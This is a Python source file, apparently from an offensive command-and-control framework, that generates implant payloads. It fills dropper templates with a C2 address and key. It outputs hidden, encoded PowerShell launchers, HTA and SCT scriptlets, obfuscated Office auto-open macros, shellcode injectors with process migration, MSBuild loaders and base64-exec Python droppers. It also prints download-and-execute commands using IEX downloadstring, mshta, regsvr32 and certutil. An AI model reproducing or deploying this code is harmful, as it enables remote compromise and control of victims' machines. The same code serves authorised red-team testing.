#!/usr/bin/env python

from Config import PayloadsDirectory, QuickCommand, FilesDirectory, DefaultMigrationProcess
from Colours import Colours
from Utils import gen_key, randomuri, formStrMacro, formStr
import StringIO, gzip, io, base64, subprocess, os, hashlib, re

class Payloads(object):

  quickstart = None

  def __init__(self, KillDate, Key, HostnameIP, Domainfrontheader, Serverport, Proxyuser, Proxypass, Proxyurl, ImplantType, Proxy,
    Insecure, UserAgent, Referrer, ConnectURL, BaseDirectory):
    self.KillDate = KillDate
    self.Key = Key
    self.DomainFrontHeader = Domainfrontheader
    self.HostnameIP = HostnameIP
    self.Serverport = Serverport
    self.Proxyuser = Proxyuser
    self.Proxypass = Proxypass
    self.Proxyurl = Proxyurl
    self.Proxy = Proxy
    self.ImplantType = ImplantType
    self.Insecure = Insecure
    self.UserAgent = UserAgent
    self.Referrer = Referrer
    self.ConnectURL = ConnectURL
    self.BaseDirectory = BaseDirectory
    self.PSDropper = ""
    self.PyDropper = ""
    if os.path.exists("%saes.py" % PayloadsDirectory):
      with open("%saes.py" % PayloadsDirectory, 'rb') as f:
        content = f.read()
        import re
        m = re.search('#KEY(.+?)#KEY', content)
        if m: keyfound = m.group(1)
        self.PyDropperHash = hashlib.sha512(content).hexdigest()
        self.PyDropperKey = keyfound
    else:
      self.PyDropperKey = gen_key()
      randomkey = self.PyDropperKey
      with open("%saes.py" % FilesDirectory, 'rb') as f:
        content = f.read()
      aespy = content.replace("#REPLACEKEY#","#KEY%s#KEY" % randomkey)
      filename = "%saes.py" % (self.BaseDirectory)
      output_file = open(filename, 'w')
      output_file.write(aespy)
      output_file.close()
      self.PyDropperHash = hashlib.sha512(aespy).hexdigest()

    cs = content.replace("#REPLACEKILLDATE#",self.KillDate)
    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PyDropperHash)
    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PyDropperKey)
    cs3 = cs2.replace("#REPLACEKEY#",self.Key)
    cs4 = cs3.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
    cs5 = cs4.replace("#REPLACEQUICKCOMMAND#",(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"))
    cs6 = cs5.replace("#REPLACECONNECTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
    cs7 = cs6.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
    cs8 = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)

    with open("%sdropper.ps1" % FilesDirectory, 'rb') as f:
     content = f.read()

    cs = content.replace("#REPLACEINSECURE#",self.Insecure)
    cs1 = cs.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
    cs2 = cs1.replace("#REPLACEIMPTYPE#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+self.ImplantType))
    cs3 = cs2.replace("#REPLACEKILLDATE#",self.KillDate)
    cs4 = cs3.replace("#REPLACEPROXYUSER#",self.Proxyuser)
    cs5 = cs4.replace("#REPLACEPROXYPASS#",self.Proxypass)
    cs6 = cs5.replace("#REPLACEPROXYURL#",self.Proxyurl)
    cs7 = cs6.replace("#REPLACEPROXY#",self.Proxy)
    cs8 = cs7.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
    cs9 = cs8.replace("#REPLACECONNECT#",self.ConnectURL)
    cs10 = cs9.replace("#REPLACEUSERAGENT#",self.UserAgent)
    cs11 = cs10.replace("#REPLACEREFERER#",self.Referrer)
    self.PSDropper = cs11.replace("#REPLACEKEY#",self.Key)
     
  def QuickstartLog(self, txt):
    if not self.quickstart: self.quickstart = ''
    print txt
    self.quickstart += txt + '\n'
  
  def WriteQuickstart(self, path):
    with open(path, 'w') as f:
      f.write(self.quickstart + Colours.END)
      print ''
      print 'Quickstart written to ' + path

  def CreateRawBase(self, full=False):
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
      f.write((self.PSDropper))
    gzipdata = base64.b64encode(out.getvalue())
    b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
    batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e " + base64.b64encode(b64gzip.encode('UTF-16LE'))
    if full:
      return batfile
    else:
      return base64.b64encode(b64gzip.encode('UTF-16LE'))

  def CreateRaw(self, name=""):
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
      f.write((self.PSDropper))
    gzipdata = base64.b64encode(out.getvalue())
    b64gzip = "IEX(New-Object IO.StreamReader((New-Object System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String('%s'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
    filename = "%s%spayload.txt" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(self.PSDropper)
    output_file.close()
    self.QuickstartLog("Raw Payload written to: %s" % filename)

    batfile = "powershell -exec bypass -Noninteractive -windowstyle hidden -e " + base64.b64encode(b64gzip.encode('UTF-16LE'))
    filename = "%s%spayload.bat" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(batfile)
    output_file.close()
    self.QuickstartLog("Batch Payload written to: %s" % filename)


  def PatchSharpBytes(self, filename, dll, offset, name=""):
    fname = filename
    filename = "%s%s" % (self.BaseDirectory,filename)

    output_file = open(filename, 'wb')
    output_file.write(base64.b64decode(dll))
    output_file.close()

    srcfilename = "%s%s%s" % (self.BaseDirectory,name,"dropper_cs.dll")
    with open(srcfilename, "rb") as b:
      dllbase64 = base64.b64encode(b.read())

    patchlen = 48000 - len(dllbase64.encode('UTF-16LE'))
    patch = dllbase64.encode('UTF-16LE')
    patch2 = ""
    patch2 = patch2.ljust(patchlen, '\x00')
    patch3 = "%s%s" % (patch,patch2)

    f = open(filename, "r+b")
    f.seek(offset)
    f.write(patch3)
    f.close()

    self.QuickstartLog("Payload written to: %s" % (filename))
    
  def PatchBytes(self, filename, dll, offset, name):
    filename = "%s%s" % (self.BaseDirectory,filename)

    output_file = open(filename, 'wb')
    output_file.write(base64.b64decode(dll))
    output_file.close()

    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
      f.write((self.PSDropper))
    gzipdata = base64.b64encode(out.getvalue())
    b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
    patchlen = 16000 - len((base64.b64encode(b64gzip.encode('UTF-16LE'))).encode('UTF-16LE'))
    patch = (base64.b64encode(b64gzip.encode('UTF-16LE'))).encode('UTF-16LE')
    patch2 = ""
    patch2 = patch2.ljust(patchlen, '\x00')
    patch3 = "%s%s" % (patch,patch2)

    f = open(filename, "r+b")
    f.seek(offset)
    f.write(patch3)
    f.close()

    self.QuickstartLog("Payload written to: %s" % (filename))
    

  def CreateDlls(self, name=""):
    # Create Sharp DLL
    with open("%sdropper.cs" % FilesDirectory, 'rb') as f:
      content = f.read()
    cs = content.replace("#REPLACEKEY#",self.Key)
    cs1 = cs.replace("#REPLACEBASEURL#",(self.HostnameIP+":"+self.Serverport))
    cs2 = cs1.replace("#REPLACESTARTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?c"))
    cs3 = cs2.replace("#REPLACEKILLDATE#",self.KillDate)
    cs4 = cs3.replace("#REPLACEDF#",self.DomainFrontHeader)
    cs5 = cs4.replace("#REPLACEUSERAGENT#",self.UserAgent)
    cs6 = cs5.replace("#REPLACEREFERER#",self.Referrer)
    cs7 = cs6.replace("#REPLACEPROXYURL#",self.Proxyurl)
    cs8 = cs7.replace("#REPLACEPROXYUSER#",self.Proxyuser)
    cs9 = cs8.replace("#REPLACEPROXYPASSWORD#",self.Proxypass)
    
    self.QuickstartLog("C# Dropper Payload written to: %s%sdropper.cs" % (self.BaseDirectory,name))
    filename = "%s%sdropper.cs" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(cs9)
    output_file.close()
    if os.name == 'nt':
        compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs.dll %s%sdropper.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
        compileexe =  "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs.exe %s%sdropper.cs " % (self.BaseDirectory, name, self.BaseDirectory, name)
    else:
        compile = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.dll -target:library -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
        compileexe = "mono-csc %s%sdropper.cs -out:%s%sdropper_cs.exe -target:exe -warn:2" % (self.BaseDirectory,name,self.BaseDirectory,name)
    subprocess.check_output(compile, shell=True)
    self.QuickstartLog("C# Dropper DLL written to: %s%sdropper_cs.dll" % (self.BaseDirectory,name))
    subprocess.check_output(compileexe, shell=True)
    self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory,name))
          
    # Load CLR "v2.0.50727"
    self.QuickstartLog("" + Colours.END)
    self.QuickstartLog("ReflectiveDLL that loads CLR v2.0.50727 - DLL Export (VoidFunc)" + Colours.GREEN)
    with open('%sPosh_v2_x86_dll.b64' % FilesDirectory, 'r') as f:
        v2_86 = f.read() 
    self.PatchBytes("%sPosh_v2_x86.dll" % name, v2_86, 0x00012D80, "DLL")
    with open('%sPosh_v2_x64_dll.b64' % FilesDirectory, 'r') as f:
        v2_64 = f.read()
    self.PatchBytes("%sPosh_v2_x64.dll" % name, v2_64, 0x00014D00, "DLL")
    
    # Load CLR "v4.0.30319"
    self.QuickstartLog("" + Colours.END)
    self.QuickstartLog("ReflectiveDLL that loads CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
    with open('%sPosh_v4_x86_dll.b64' % FilesDirectory, 'r') as f:
        v4_86 =  f.read()
    self.PatchBytes("%sPosh_v4_x86.dll" % name, v4_86, 0x00012F80, "DLL")
    with open('%sPosh_v4_x64_dll.b64' % FilesDirectory, 'r') as f:
        v4_64 = f.read() 
    self.PatchBytes("%sPosh_v4_x64.dll" % name, v4_64, 0x00014F00, "DLL")
    
    # Load CLR "v4.0.30319"
    self.QuickstartLog("" + Colours.END)
    self.QuickstartLog("ReflectiveDLL that loads C# Implant in CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
    with open('%sSharp_v4_x86_dll.b64' % FilesDirectory, 'r') as f:
        v4_86 = f.read() 
    self.PatchSharpBytes("%sSharp_v4_x86.dll" % name, v4_86, 0x00012F80, "")
    with open('%sSharp_v4_x64_dll.b64' % FilesDirectory, 'r') as f:
        v4_64 = f.read()
    self.PatchSharpBytes("%sSharp_v4_x64.dll" % name, v4_64, 0x00014F00, "")
    self.QuickstartLog(Colours.END)
    self.QuickstartLog("RunDLL Example:"+Colours.GREEN)
    self.QuickstartLog("rundll32 Sharp_v4_x64.dll,VoidFunc")
    
  def CreateShellcode(self, name=""):
    # Load CLR "v2.0.50727"
    self.QuickstartLog(Colours.END)
    self.QuickstartLog("Shellcode that loads CLR v2.0.50727" + Colours.GREEN)
    v2_86_offset = 0x000130E0 + 4
    with open('%sPosh_v2_x86_Shellcode.b64' % FilesDirectory, 'r') as f:
        v2_86 = f.read()
    self.PatchBytes("%sPosh_v2_x86_Shellcode.bin" % name, v2_86, v2_86_offset, "Shellcode")
    with open("%s%sPosh_v2_x86_Shellcode.bin" % (self.BaseDirectory, name), 'r') as binary:
      with open("%s%sPosh_v2_x86_Shellcode.b64" % (self.BaseDirectory, name), 'w') as b64:
        b64.write(base64.b64encode(binary.read()))
    v2_64_offset = 0x00015150 + 8
    with open('%sPosh_v2_x64_Shellcode.b64' % FilesDirectory, 'r') as f:
        v2_64 = f.read() 
    self.PatchBytes("%sPosh_v2_x64_Shellcode.bin" % name, v2_64, v2_64_offset, "Shellcode")
    with open("%s%sPosh_v2_x64_Shellcode.bin" % (self.BaseDirectory, name), 'r') as binary:
      with open("%s%sPosh_v2_x64_Shellcode.b64" % (self.BaseDirectory, name), 'w') as b64:
        b64.write(base64.b64encode(binary.read()))

    # Load CLR "v4.0.30319"
    self.QuickstartLog(Colours.END)
    self.QuickstartLog("Shellcode that loads CLR v4.0.30319" + Colours.GREEN)
    v4_86_offset = 0x000132E0 + 4
    with open('%sPosh_v4_x86_Shellcode.b64' % FilesDirectory, 'r') as f:
        v4_86 = f.read() 
    self.PatchBytes("%sPosh_v4_x86_Shellcode.bin" % name, v4_86, v4_86_offset, "Shellcode")
    with open("%s%sPosh_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'r') as binary:
      with open("%s%sPosh_v4_x86_Shellcode.b64" % (self.BaseDirectory, name), 'w') as b64:
        b64.write(base64.b64encode(binary.read()))
    v4_64_offset = 0x00015350 + 8
    with open('%sPosh_v4_x64_Shellcode.b64' % FilesDirectory, 'r') as f:
        v4_64 = f.read() 
    self.PatchBytes("%sPosh_v4_x64_Shellcode.bin" % name, v4_64, v4_64_offset, "Shellcode")
    with open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'r') as binary:
      with open("%s%sPosh_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'w') as b64:
        b64.write(base64.b64encode(binary.read()))

    # Load CLR "v4.0.30319" via SharpDLL
    with open('%sSharp_v4_x86_Shellcode.b64' % FilesDirectory) as f:
        v4_86 = f.read() 
    self.PatchSharpBytes("%sSharp_v4_x86_Shellcode.bin" % name, v4_86, 0x000132E0 + 4, name)
    with open("%s%sSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'r') as binary:
      with open("%s%sSharp_v4_x86_Shellcode.b64" % (self.BaseDirectory, name), 'w') as b64:
        b64.write(base64.b64encode(binary.read()))
    with open('%sSharp_v4_x64_Shellcode.b64' % FilesDirectory) as f:
        v4_64 = f.read() 
    self.PatchSharpBytes("%sSharp_v4_x64_Shellcode.bin" % name, v4_64, 0x00015350 +  8, name)
    with open("%s%sSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'r') as binary:
      with open("%s%sSharp_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'w') as b64:
        b64.write(base64.b64encode(binary.read()))

  def CreateSCT(self):
    basefile = self.CreateRawBase()
    raw1 = """<?XML version="1.0"?>
<scriptlet>

<registration
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

<script language="VBScript">
Dim ghgfhgfh
set ghgfhgfh = CreateObject("shell.application")
ghgfhgfh.ShellExecute "powershell.exe", " -exec bypass -Noninteractive -windowstyle hidden -e %s", "", "open", 0
</script>

</registration>
</scriptlet>
""" % basefile

    raw2 = """<sCrIptlEt><scRIPt>
a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec bypass -Noninteractive -windowstyle hidden -e %s","","open","0");
</scRIPt></sCrIptlEt>
""" % basefile
    filename = "%srg_sct.xml" % (self.BaseDirectory)
    output_file = open(filename, 'w')
    output_file.write(raw1)
    filename = "%scs_sct.xml" % (self.BaseDirectory)
    output_file.close()
    output_file = open(filename, 'w')
    output_file.write(raw2)
    output_file.close()

    self.QuickstartLog(Colours.END)
    self.QuickstartLog("Execution via Command Prompt"+Colours.GREEN)

    psuri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_bs"
    pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')" % psuri
    psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
    uri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_cs"

    #self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')\"" % psuri)
    #self.QuickstartLog("")
    self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc)
    self.QuickstartLog(Colours.END)
    #self.QuickstartLog("Execution via Powershell"+Colours.GREEN)
    #self.QuickstartLog("[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')" % psuri)
    #self.QuickstartLog(Colours.END)
    self.QuickstartLog("Other Execution Methods"+Colours.GREEN)
    self.QuickstartLog("mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % uri)
    uri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_rg"
    self.QuickstartLog("regsvr32 /s /n /u /i:%s scrobj.dll" % uri)
    self.QuickstartLog("")

  def CreateHTA(self):
    basefile = self.CreateRawBase(full=True)
    hta = """<script>
ao=new ActiveXObject("W"+"S"+"cr"+"ip"+"t."+"Sh"+"e"+"l"+"l");
ao.run('%s', 0);window.close();
</script>""" % basefile
    self.QuickstartLog("HTA Payload written to: %sLauncher.hta" % self.BaseDirectory)
    filename = "%sLauncher.hta" % (self.BaseDirectory)
    output_file = open(filename, 'w')
    output_file.write(hta)
    output_file.close()

  def CreateCS(self):
    basefile = self.CreateRawBase()
    with open("%sSharp_Powershell_Runner.cs" % FilesDirectory, 'rb') as f:
      content = f.read()
    cs = content.replace("#REPLACEME#",basefile)
    self.QuickstartLog("CS Powershell Stager source written to: %sSharp_Posh_Stager.cs" % self.BaseDirectory)
    filename = "%sSharp_Posh_Stager.cs" % (self.BaseDirectory)
    output_file = open(filename, 'w')
    output_file.write(cs)
    output_file.close()

  def CreatePython(self, name=""):
    self.QuickstartLog(Colours.END)
    self.QuickstartLog("OSX/Unix Python Payload:"+Colours.GREEN)
    with open("%sdropper.py" % FilesDirectory, 'rb') as f:
      content = f.read()
    cs = content.replace("#REPLACEKILLDATE#",self.KillDate)
    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PyDropperHash)
    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PyDropperKey)
    cs3 = cs2.replace("#REPLACEKEY#",self.Key)
    cs4 = cs3.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
    cs5 = cs4.replace("#REPLACEQUICKCOMMAND#",(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"))
    cs6 = cs5.replace("#REPLACECONNECTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
    cs7 = cs6.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
    self.PyDropper = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)

    py = base64.b64encode(self.PyDropper)
    pydropper_bash = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
    filename = "%s%spy_dropper.sh" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(pydropper_bash)
    output_file.close()
    self.QuickstartLog(pydropper_bash)

    pydropper_python = "import sys,base64;exec(base64.b64decode('%s'));" % py
    filename = "%s%spy_dropper.py" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(pydropper_python)
    output_file.close()

  def CreateEXE(self, name=""):
    with open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory,name), 'rb') as f:
      sc64 = f.read()
    hexcode = "".join("\\x{:02x}".format(ord(c)) for c in sc64)
    sc64 = formStr("char sc[]",hexcode)

    with open("%sShellcode_Injector.c" % FilesDirectory, 'rb') as f:
      content = f.read()
    ccode = content.replace("#REPLACEME#",sc64)
    self.QuickstartLog("64bit EXE Payload written to: %s%sPosh64.exe" % (self.BaseDirectory,name))
    filename = "%s%sPosh64.c" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(ccode)
    output_file.close()

    with open("%sShellcode_Injector_Migrate.c" % FilesDirectory, 'rb') as f:
      content = f.read()
    ccode = content.replace("#REPLACEME#",sc64)
    migrate_process = DefaultMigrationProcess
    if "\\" in migrate_process and "\\\\" not in migrate_process:
      migrate_process = migrate_process.replace("\\", "\\\\")
    ccode = ccode.replace("#REPLACEMEPROCESS#", migrate_process)
    self.QuickstartLog("64bit EXE Payload written to: %s%sPosh64_migrate.exe" % (self.BaseDirectory,name))
    filename = "%s%sPosh64_migrate.c" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(ccode)
    output_file.close()

    with open("%s%sPosh_v4_x86_Shellcode.bin" % (self.BaseDirectory,name), 'rb') as f:
      sc32 = f.read()
    hexcode = "".join("\\x{:02x}".format(ord(c)) for c in sc32)
    sc32 = formStr("char sc[]",hexcode)

    with open("%sShellcode_Injector.c" % FilesDirectory, 'rb') as f:
      content = f.read()
    ccode = content.replace("#REPLACEME#",sc32)
    self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32.exe" % (self.BaseDirectory,name))
    filename = "%s%sPosh32.c" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(ccode)
    output_file.close()

    with open("%sShellcode_Injector_Migrate.c" % FilesDirectory, 'rb') as f:
      content = f.read()
    ccode = content.replace("#REPLACEME#",sc32)
    ccode = ccode.replace("#REPLACEMEPROCESS#", migrate_process)
    self.QuickstartLog("32bit EXE Payload written to: %s%sPosh32_migrate.exe" % (self.BaseDirectory,name))
    filename = "%s%sPosh32_migrate.c" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(ccode)
    output_file.close()

    try:
        uri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_ex6"
        filename = randomuri()
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Download Posh64.exe using certutil:"+Colours.GREEN)
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri,filename))
        if os.name == 'nt':
            compile64 = "C:\\TDM-GCC-64\\bin\\gcc.exe %s%sPosh64.c -o %s%sPosh64.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
            compile32 = "C:\\TDM-GCC-32\\bin\\gcc.exe %s%sPosh32.c -o %s%sPosh32.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
        else:
            compile64 = "x86_64-w64-mingw32-gcc %s%sPosh64.c -o %s%sPosh64.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
            compile32 = "i686-w64-mingw32-gcc %s%sPosh32.c -o %s%sPosh32.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
        subprocess.check_output(compile64, shell=True)
        subprocess.check_output(compile32, shell=True)

        filename = randomuri()
        self.QuickstartLog(Colours.END)
        self.QuickstartLog("Download Posh32.exe using certutil:"+Colours.GREEN)
        self.QuickstartLog("certutil -urlcache -split -f %s %%temp%%\\%s.exe" % (uri,filename))
        if os.name == 'nt':
            compile64 = "C:\\TDM-GCC-64\\bin\\gcc.exe %s%sPosh64_migrate.c -o %s%sPosh64_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
            compile32 = "C:\\TDM-GCC-32\\bin\\gcc.exe %s%sPosh32_migrate.c -o %s%sPosh32_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
        else:
            compile64 = "x86_64-w64-mingw32-gcc %s%sPosh64_migrate.c -o %s%sPosh64_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
            compile32 = "i686-w64-mingw32-gcc %s%sPosh32_migrate.c -o %s%sPosh32_migrate.exe" % (self.BaseDirectory, name, self.BaseDirectory,name)
        subprocess.check_output(compile64, shell=True)
        subprocess.check_output(compile32, shell=True)

    except Exception as e:
        print e
        print "apt-get install mingw-w64-tools mingw-w64 mingw-w64-x86-64-dev mingw-w64-i686-dev mingw-w64-common"

  def CreateMacro(self, name=""):
    basefile = self.CreateRawBase()
    strmacro = formStrMacro("str",basefile)
    macro="""Sub Auto_Open()
UpdateMacro
End Sub

Sub AutoOpen()
UpdateMacro
End Sub

Sub Workbook_Open()
UpdateMacro
End Sub

Sub WorkbookOpen()
UpdateMacro
End Sub

Sub Document_Open()
UpdateMacro
End Sub

Sub DocumentOpen()
UpdateMacro
End Sub

Sub UpdateMacro()
Dim str, exec

%s

exec = "p"
exec = exec + "o"
exec = exec + "w"
exec = exec + "e"
exec = exec + "r"
exec = exec + "s"
exec = exec + "h"
exec = exec + "e"
exec = exec + "l"
exec = exec + "l"
exec = exec + "."
exec = exec + "e"
exec = exec + "x"
exec = exec + "e"
exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str

Shell(exec)
End Sub

""" % strmacro
    self.QuickstartLog("Macro Payload written to: %s%smacro.txt" % (self.BaseDirectory,name))
    filename = "%smacro.txt" % (self.BaseDirectory)
    output_file = open(filename, 'w')
    output_file.write(macro)
    output_file.close()

  def CreateMsbuild(self, name=""):
    x86filename = "%s%s" % (self.BaseDirectory,name+"Posh_v4_x86_Shellcode.bin")
    x64filename = "%s%s" % (self.BaseDirectory,name+"Posh_v4_x64_Shellcode.bin")
    with open(x86filename, "rb") as b86:
      x86base64 = base64.b64encode(b86.read())
    with open(x64filename, "rb") as b64:
      x64base64 = base64.b64encode(b64.read())
    with open("%scsc.cs" % FilesDirectory, 'rb') as f:
      content = f.read()
    ccode = content.replace("#REPLACEME32#",x86base64)
    ccode = ccode.replace("#REPLACEME64#",x64base64)
    filename = "%s%scsc.cs" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(ccode)
    output_file.close()
    self.QuickstartLog("")
    self.QuickstartLog("CSC file written to: %s%scsc.cs" % (self.BaseDirectory,name))
    with open("%smsbuild.xml" % FilesDirectory, 'rb') as f:
      msbuild = f.read()
    projname = randomuri()
    msbuild = msbuild.replace("#REPLACEME32#",x86base64)
    msbuild = msbuild.replace("#REPLACEME64#",x64base64)
    msbuild = msbuild.replace("#REPLACEMERANDSTRING#",projname)
    self.QuickstartLog("Msbuild file written to: %s%smsbuild.xml" % (self.BaseDirectory,name))
    filename = "%s%smsbuild.xml" % (self.BaseDirectory,name)
    output_file = open(filename, 'w')
    output_file.write(msbuild)
    output_file.close()
